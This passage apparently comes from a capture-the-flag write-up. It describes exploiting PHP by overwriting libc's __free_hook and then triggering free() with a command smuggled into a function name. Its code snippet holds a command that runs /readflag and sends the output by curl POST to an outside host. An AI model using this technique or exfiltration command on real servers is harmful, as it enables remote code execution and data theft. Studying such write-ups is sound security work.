In this challenge we decided not to go with further php object corruption (ain't got no time for digging php internals). Instead we overwrote `__free_hook` in libc.

Now there are some problems as to how you can reliably get the offset to `__free_hook`. We solved it by dumping memory with the help of relative read and then finding the `/bin/sh` string inside that dump.
This gives us the offset to the base of libc (while addresses could be dumped by reading `/proc/self/maps`).

The final stage of the exploit is to trigger `free()` with controlled data, this is done by triggering fatal error inside php by calling non-existent function with broken name that contains the command we want to execute.

```
    $a = ";/readflag > /tmp/sicemehackerman; curl -X POST http://REDACTED/ -d \"@/tmp/sicemehackerman\";#";
    try{
    $_SERVER['DEET'] = $a();
}catch(Exception $e){
    echo("exception");
}
```
